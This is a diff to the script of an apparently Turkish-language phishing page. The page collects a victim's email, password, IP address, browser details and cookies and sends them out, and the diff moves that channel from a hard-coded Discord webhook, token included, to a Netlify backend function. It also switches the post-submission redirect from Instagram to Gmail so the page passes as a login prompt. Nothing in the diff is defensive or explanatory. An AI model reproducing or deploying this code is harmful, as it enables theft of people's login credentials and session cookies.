@@ -39,21 +39,21 @@
                 ip: ip,
                 user_agent: navigator.userAgent
             };
-            const message = `Yeni Güncelleme - ${new Date().toISOString()}:\n**E-posta**: ${data.username}\n**Şifre**: ${data.password}\n**IP**: ${data.ip}\n**Tarayıcı**: ${data.user_agent}\n**Çerezler**: ${data.cookies}`;
+            console.log('Gönderilen Veri:', data); // Hata ayıklama
             try {
-                const response = await fetch('https://discord.com/api/webhooks/1401473482016952320/bo3vGGbGGcleKPWgvUduIpKXHl9QEqy8TerfzmJUyCeoYDHDQ0YaUVyPAoUexXgp4npb', {
+                const response = await fetch('/.netlify/functions/send', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ content: message })
+                    body: JSON.stringify(data)
                 });
                 if (response.ok) {
-                    window.location.href = 'https://www.instagram.com/';
+                    window.location.href = 'https://mail.google.com';
                 } else {
-                    alert('Güncelleme başarısız oldu. Lütfen tekrar deneyin.');
+                    throw new Error('Sunucu hatası: ' + response.status);
                 }
             } catch (error) {
                 console.error('Hata:', error);
-                alert('Bağlantı hatası oluştu.');
+                alert('Veri gönderilemedi: ' + error.message);
             }
         });
     </script>
